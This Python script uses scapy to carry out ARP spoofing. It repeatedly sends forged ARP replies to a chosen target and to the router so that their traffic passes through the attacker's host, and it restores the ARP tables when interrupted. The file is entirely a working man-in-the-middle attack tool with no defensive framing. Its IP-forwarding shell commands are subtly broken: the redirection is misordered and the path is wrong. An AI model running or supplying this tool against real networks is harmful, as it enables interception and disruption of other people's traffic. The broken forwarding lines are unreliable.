#!/usr/bin/python3.12
from argparse import ArgumentParser
from scapy.layers.l2 import Ether, ARP, srp
from scapy.sendrecv import send
from subprocess import check_output
from time import sleep


def get_args():
    """Requirement three arguments from user before to run."""
    parser = ArgumentParser()
    parser.add_argument("-i", "--interface", help="An interface.")
    parser.add_argument("-t", "--target", help="Target's IP.")
    parser.add_argument("-r", "--router", help="Router's IP")
    args = parser.parse_args()
    if not args.interface:
        parser.error("\n[-] Specify an interface!")
    elif not args.target:
        parser.error("\n[-] Specify target's IP.")
    elif not args.router:
        parser.error("\n[-] Specify router's IP.")
    return args


def get_mac(target_ip):
    """MAC extractor"""
    brd_and_arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
    answered_list = srp(brd_and_arp_request, verbose=0, timeout=1)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, router_ip):
    """Spoof the victim (destination)"""
    target_mac = get_mac(target_ip)
    spoof_pack = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    send(spoof_pack, verbose=0)


def reset(target_ip, router_ip):
    """Spoof the gateway (source)."""
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    reset_pack = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    send(reset_pack, verbose=0, count=4)


def run(interface, target, router):
    """Run script. Automatically activates ip_forwarding after running and deactivates after stopping."""
    print(f"--------------------------------------------------"
          f"\n[!] Using interface: {interface}"
          f"\n[!] Target's IP: {target}"
          f"\n[!] Router's IP: {router}")

    try:
        print("\n\n[!] Press CTRL + C to stop program and restore ARP tables!")
        check_output("echo > 1 /proc/sys/net/ipv4_forward", shell=True)
        packets = 0

        while True:
            spoof(target, router)
            spoof(router, target)
            packets += 2
            print(f"\r\tPackets sent: {packets}", end='')
            sleep(2)

    except KeyboardInterrupt:
        reset(target, router)
        reset(router, target)
        check_output("echo 0 > /proc/sys/net/ipv4_forward", shell=True)
        print("\n[+] You have stopped program. ARP tables are set to defaults."
              "\n------------------------------------------------")


user_args = get_args()
run(user_args.interface, user_args.target, user_args.router)
